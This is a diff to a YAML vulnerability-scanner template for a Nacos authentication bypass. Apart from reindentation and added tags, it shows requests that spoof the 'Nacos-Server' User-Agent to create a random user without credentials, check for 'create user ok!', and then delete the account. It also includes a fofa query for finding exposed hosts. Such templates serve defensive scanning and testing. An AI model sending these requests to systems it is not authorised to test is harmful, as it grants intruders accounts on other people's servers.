@@ -5,31 +5,34 @@ info:
   author: zan8in
   severity: high
   verified: true
-  description: fofa app="NACOS"
+  description: |-
+    fofa app="NACOS"
+  tags: nacos,unauth
+  created: 2023/07/07
 
 set:
-    r1: randomLowercase(8)
-    r2: randomLowercase(8)
+  r1: randomLowercase(8)
+  r2: randomLowercase(8)
 rules:
   r0:
     request:
-        method: POST
-        path: /nacos/v1/auth/users?username={{r1}}&password={{r2}}
-        headers:
-          User-Agent: Nacos-Server
+      method: POST
+      path: /nacos/v1/auth/users?username={{r1}}&password={{r2}}
+      headers:
+        User-Agent: Nacos-Server
     expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
   r1:
     request:
-        method: POST
-        path: /v1/auth/users?username={{r1}}&password={{r2}}
-        headers:
-          User-Agent: Nacos-Server
+      method: POST
+      path: /v1/auth/users?username={{r1}}&password={{r2}}
+      headers:
+        User-Agent: Nacos-Server
     expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
   r2:
     request:
       method: DELETE
       path: /nacos/v1/auth/users?username={{r1}}
       headers:
-          User-Agent: Nacos-Server
+        User-Agent: Nacos-Server
     expression: true
 expression: (r0() && r2()) || (r1() && r2())
